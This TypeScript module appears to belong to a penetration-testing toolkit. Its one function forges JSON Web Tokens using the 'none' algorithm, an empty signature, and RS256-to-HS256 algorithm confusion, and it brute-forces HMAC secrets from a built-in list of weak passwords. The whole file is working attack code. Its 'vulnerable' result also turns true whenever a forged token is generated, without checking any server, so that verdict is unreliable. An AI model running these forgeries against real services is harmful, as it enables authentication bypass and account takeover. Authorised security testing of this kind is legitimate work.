import { z } from 'zod';
import { createHmac } from 'crypto';

export const jwtAttackSchema = z.object({
  token: z.string().describe('JWT token to test'),
  attacks: z.array(z.enum(['none_alg', 'empty_sig', 'weak_secret', 'alg_confusion']))
    .default(['none_alg', 'empty_sig', 'weak_secret'])
    .describe('Attack techniques to attempt'),
  secrets: z.array(z.string()).optional()
    .describe('Custom secrets to try (added to default weak list)'),
});

export type JwtAttackInput = z.infer<typeof jwtAttackSchema>;

interface JwtAttackResult {
  attack: string;
  success: boolean;
  details: string;
  forgedToken?: string;
  secret?: string;
}

const WEAK_SECRETS = [
  'secret', 'password', '123456', 'key', 'jwt_secret', 'changeme',
  'admin', 'test', 'default', 'supersecret', 'mysecret', 'jwt',
  '', 'null', 'undefined', 'true', 'false', '1234567890',
];

export async function jwtAttack(input: JwtAttackInput): Promise<{
  success: boolean;
  token: string;
  results: JwtAttackResult[];
  vulnerable: boolean;
  error?: string;
}> {
  const { token, attacks, secrets } = input;
  const parts = token.split('.');

  if (parts.length !== 3) {
    return { success: false, token: token.slice(0, 20) + '...', results: [], vulnerable: false, error: 'Invalid JWT format' };
  }

  let header: Record<string, unknown>;
  let payload: Record<string, unknown>;
  try {
    header = JSON.parse(b64UrlDecode(parts[0]));
    payload = JSON.parse(b64UrlDecode(parts[1]));
  } catch {
    return { success: false, token: token.slice(0, 20) + '...', results: [], vulnerable: false, error: 'Cannot decode JWT' };
  }

  const results: JwtAttackResult[] = [];

  // Attack 1: "none" algorithm
  if (attacks.includes('none_alg')) {
    const noneHeader = b64UrlEncode(JSON.stringify({ ...header, alg: 'none' }));
    const nonePayload = parts[1];
    const forgedToken = `${noneHeader}.${nonePayload}.`;

    results.push({
      attack: 'none_alg',
      success: true,
      details: 'Generated token with alg:"none". If server accepts it, signature verification is bypassed.',
      forgedToken,
    });
  }

  // Attack 2: Empty signature
  if (attacks.includes('empty_sig')) {
    const forgedToken = `${parts[0]}.${parts[1]}.`;
    results.push({
      attack: 'empty_sig',
      success: true,
      details: 'Token with empty signature. Test if server validates signature.',
      forgedToken,
    });
  }

  // Attack 3: Weak secret brute force (HS256)
  if (attacks.includes('weak_secret')) {
    const alg = String(header.alg || '').toUpperCase();
    if (alg.startsWith('HS')) {
      const allSecrets = [...new Set([...WEAK_SECRETS, ...(secrets || [])])];
      const signingInput = `${parts[0]}.${parts[1]}`;
      const originalSig = parts[2];

      let found = false;
      for (const secret of allSecrets) {
        const hashAlg = alg === 'HS384' ? 'sha384' : alg === 'HS512' ? 'sha512' : 'sha256';
        const sig = createHmac(hashAlg, secret)
          .update(signingInput)
          .digest('base64url');

        if (sig === originalSig) {
          results.push({
            attack: 'weak_secret',
            success: true,
            details: `Cracked! HMAC secret is weak.`,
            secret,
          });
          found = true;
          break;
        }
      }

      if (!found) {
        results.push({
          attack: 'weak_secret',
          success: false,
          details: `Tested ${allSecrets.length} weak secrets — none matched. Secret appears strong.`,
        });
      }
    } else {
      results.push({
        attack: 'weak_secret',
        success: false,
        details: `Token uses ${alg} (asymmetric). Weak secret test only applies to HS256/384/512.`,
      });
    }
  }

  // Attack 4: Algorithm confusion (RS256 → HS256)
  if (attacks.includes('alg_confusion')) {
    const alg = String(header.alg || '').toUpperCase();
    if (alg.startsWith('RS') || alg.startsWith('ES') || alg.startsWith('PS')) {
      const confusedHeader = b64UrlEncode(JSON.stringify({ ...header, alg: 'HS256' }));
      results.push({
        attack: 'alg_confusion',
        success: true,
        details: `Original algorithm: ${header.alg}. Generated HS256 variant. If server uses public key as HMAC secret, attacker can forge tokens by signing with the public key.`,
        forgedToken: `${confusedHeader}.${parts[1]}.[sign-with-public-key]`,
      });
    } else {
      results.push({
        attack: 'alg_confusion',
        success: false,
        details: `Token uses ${alg}. Algorithm confusion targets asymmetric algorithms (RS256, ES256, PS256).`,
      });
    }
  }

  return {
    success: true,
    token: token.slice(0, 20) + '...',
    results,
    vulnerable: results.some(r => r.success && (r.attack === 'weak_secret' || r.forgedToken !== undefined)),
  };
}

function b64UrlDecode(str: string): string {
  let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
  while (base64.length % 4) base64 += '=';
  return Buffer.from(base64, 'base64').toString('utf8');
}

function b64UrlEncode(str: string): string {
  return Buffer.from(str).toString('base64url');
}
